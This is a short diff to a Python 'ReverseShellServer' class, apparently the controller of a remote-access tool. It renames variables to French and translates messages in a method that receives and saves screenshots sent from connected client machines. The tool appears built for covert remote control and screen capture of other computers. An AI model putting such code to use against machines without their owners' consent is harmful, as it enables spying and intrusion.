@@ -137,18 +137,18 @@ class ReverseShellServer:
     def handle_screenshot(self, conn, client_id): # Fonction pour prendre un screenshot
         file_path = f"screenshot_{client_id}.png" # Nom du fichier de capture d'écran
         try: # On essaie de prendre un screenshot
-            len_img = int(conn.recv(1024).decode()) # On reçoit la taille de l'image
+            longueur_img = int(conn.recv(1024).decode()) # On reçoit la taille de l'image
             with open(file_path, "wb") as img: # On ouvre le fichier en mode écriture binaire
-                dl_data = 0 # j'initialise la variable dl_data à 0
-                while dl_data < len_img:  # Tant que dl_data est inférieur à len_img
-                    data = conn.recv(4096) # On reçoit les données
-                    if not data: # Si data est vide
+                first_data = 0 # j'initialise la variable dl_data à 0
+                while first_data < longueur_img:  # Tant que dl_data est inférieur à len_img
+                    donnees = conn.recv(4096) # On reçoit les données
+                    if not donnees: # Si data est vide
                         break
-                    img.write(data) # On écrit les données dans le fichier
-                    dl_data += len(data) # On incrémente dl_data de la taille des données
-            print(f"[+] Screenshot saved to {file_path}.") 
+                    img.write(donnees) # On écrit les données dans le fichier
+                    first_data += len(donnees) # On incrémente dl_data de la taille des données
+            print(f"[+] le screenshot est sauvegardé : {file_path}.") 
         except Exception as e:
-            print(f"[x] Failed to save screenshot: {e}")
+            print(f"[x] impossible de sauvegarder le screenshot: {e}")
 
     def handle_ipconfig(self, conn, client_id):
         os_type = self.client_id_map[client_id]["os"]
